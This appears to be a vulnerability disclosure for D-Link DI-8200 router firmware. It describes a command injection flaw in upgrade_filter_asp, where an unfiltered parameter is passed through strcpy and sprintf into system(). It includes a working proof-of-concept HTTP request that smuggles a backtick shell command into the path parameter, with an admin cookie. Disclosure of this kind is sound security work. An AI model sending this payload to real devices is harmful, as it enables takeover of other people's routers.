Firmware version:

	DI_8200-16.07.26A1
	
Download address:

	http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DI-8200)

Command injection:

	The upgrade_filter_asp function has command injection；
	The received request is sent to parm; And parm doesn't do any filtering;
	parm data is sent to v17 through strcpy, and then only "http://" is matched without any filtering；
	Splice to v16 through sprintf, and finally system(v16); Cause command injection;
	![Pasted image 20240806103832](https://github.com/user-attachments/assets/2732c797-1af5-4efb-9cc2-6e55a83620ba)


	Here is the FirmAE simulated firmware command injection process:

	![Pasted image 20240806104833](https://github.com/user-attachments/assets/de4fd74b-41f0-44f7-98d5-755d63e7b487)

	![Pasted image 20240806104945](https://github.com/user-attachments/assets/49a6b03f-22ea-49d0-bd54-89a4a25fc1e2)


poc：

```
GET /upgrade_filter.asp?path=http://`ps%20%3E%20/rce.txt` HTTP/1.1

Host: 192.168.0.1

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate, br

Accept-Language: zh,en-US;q=0.9,en;q=0.8

Cookie: wys_userid=admin,wys_passwd=861A198CDBD425F0B9D91C42FAB93A86

Connection: close


```
